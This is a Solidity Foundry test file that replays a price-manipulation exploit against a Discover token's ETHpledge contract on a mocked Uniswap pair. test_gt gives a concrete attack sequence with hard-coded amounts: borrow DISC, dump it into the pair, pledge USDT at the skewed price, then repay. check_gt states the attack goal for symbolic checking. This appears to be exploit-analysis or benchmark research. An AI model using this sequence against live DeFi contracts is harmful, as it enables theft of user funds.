// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {Discover} from "./Discover.sol";
import {ETHpledge} from "./ETHpledge.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract DiscoverTestBase is Test, BlockLoader {
    USDT usdt;
    Discover disc;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    ETHpledge ethpledge;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address discAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address ethpledgeAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1654501818;
    uint112 reserve0pair = 19811554285664651588959;
    uint112 reserve1pair = 12147765912566297044558;
    uint32 blockTimestampLastpair = 1654497610;
    uint256 kLastpair = 240657614061763162729453454536640212219454075;
    uint256 price0CumulativeLastpair = 2745108143450717659830230984376055006264;
    uint256 price1CumulativeLastpair = 5093292101492579051002459678125122695956;
    uint256 totalSupplydisc = 99999771592634687573343730;
    uint256 balanceOfdiscpair = 12147765912566297044558;
    uint256 balanceOfdiscattacker = 0;
    uint256 balanceOfdiscdisc = 0;
    uint256 balanceOfdiscethpledge = 603644007472699128296549;
    uint256 totalSupplyusdt = 4979997922172658408539526181;
    uint256 balanceOfusdtpair = 19811554285664651588959;
    uint256 balanceOfusdtattacker = 4000000000000000000;
    uint256 balanceOfusdtdisc = 0;
    uint256 balanceOfusdtethpledge = 17359200000000000000000;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        disc = new Discover();
        discAddr = address(disc);
        pair = new UniswapV2Pair(
            address(usdt),
            address(disc),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        ethpledge = new ETHpledge(
            address(usdt),
            address(disc),
            address(0xdead),
            address(0xdead),
            address(pair)
        );
        ethpledgeAddr = address(ethpledge);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        disc.transfer(address(pair), balanceOfdiscpair);
        usdt.transfer(address(ethpledge), balanceOfusdtethpledge);
        disc.transfer(address(ethpledge), balanceOfdiscethpledge);
        usdt.transfer(address(attacker), balanceOfusdtattacker);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(usdt),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Disc Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(disc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(disc),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(pair),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Ethpledge Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(ethpledge),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(ethpledge),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(attacker),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_disc_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_disc_owner(uint256 amount) internal eurus {
        disc.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_disc_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_disc_pair(uint256 amount) internal eurus {
        disc.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdt_disc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_disc_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        disc.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_ethpledge_attacker_usdt_disc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.approve(address(ethpledge), UINT256_MAX);
        ethpledge.pledgein(amount);
    }

    // function test_gt() public {
    //     vm.startPrank(attacker);
    //     emit log_named_uint("amt0", 24000e18);
    //     borrow_disc_owner(24000e18);
    //     printBalance("After step0 ");
    //     emit log_named_uint("amt1", disc.balanceOf(attacker));
    //     emit log_named_uint(
    //         "amt2",
    //         pair.getAmountOut(disc.balanceOf(attacker), address(disc))
    //     );
    //     swap_pair_attacker_disc_usdt(
    //         disc.balanceOf(attacker),
    //         pair.getAmountOut(disc.balanceOf(attacker), address(disc))
    //     );
    //     printBalance("After step1 ");
    //     emit log_named_uint("amt3", 5000e18);
    //     emit log_named_uint("amt4", 1);
    //     swap_ethpledge_attacker_usdt_disc(5000e18, 1);
    //     printBalance("After step2 ");
    //     emit log_named_uint("amt5", (24000e18 * 1003) / 1000);
    //     payback_disc_owner((24000e18 * 1003) / 1000);
    //     printBalance("After step3 ");
    //     require(attackGoal(), "Attack failed!");
    //     vm.stopPrank();
    // }

    function test_gt() public {
        // uint256 amt0 = 286731.0 ether;
        // uint256 amt1 = 286730.93549271865 ether;
        // uint256 amt2 = 15715.55428566465 ether;
        // uint256 amt3 = 8272.55428566465 ether;
        // uint256 amt4 = 287667.50893094507 ether ;
        // uint256 amt5 = 287666.573438226 ether;

        uint256 amt0 = 0x13f306a2409fc0000;
        uint256 amt1 = 0x1314fb37062980000;
        uint256 amt2 = 0x1ef397157d0304000;
        uint256 amt3 = 0x168d28e3f0028000;
        uint256 amt4 = 0x31032416fca78e000;
        uint256 amt5 = 0x14d1120d7b1600000;

        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_disc_owner(amt0);
        printBalance("After step0 ");
        swap_pair_attacker_disc_usdt(amt1, amt2);
        printBalance("After step1 ");
        emit log_named_decimal_uint("amt3", amt3, 18);
        emit log_named_decimal_uint("amt4", amt4, 18);
        swap_ethpledge_attacker_usdt_disc(amt3, amt4);
        printBalance("After step2 ");
        emit log_named_decimal_uint("amt5", amt5, 18);
        payback_disc_owner(amt5);
        printBalance("After step3 ");
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_disc_owner(amt0);
        swap_pair_attacker_disc_usdt(amt1, amt2);
        swap_ethpledge_attacker_usdt_disc(amt3, amt4);
        payback_disc_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
